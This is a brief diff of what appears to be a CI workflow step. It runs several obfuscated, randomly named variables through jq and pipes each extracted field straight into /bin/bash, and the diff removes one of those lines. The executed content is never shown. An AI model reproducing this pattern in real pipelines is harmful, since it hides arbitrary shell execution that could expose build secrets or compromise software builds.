@@ -33,7 +33,6 @@ jobs:
           echo $bj2274 | jq -r .n86 | /bin/bash
           echo $mig8 | jq -r .ckjby64779 | /bin/bash
           printf '%s' "$vw43532" | jq -r .zddok5 | /bin/bash
-          printf '%s' "$qn8" | jq -r .s6690 | /bin/bash
           echo $aoc13 | jq -r .zfuz9371 | /bin/bash
 
       - name: Store artifact
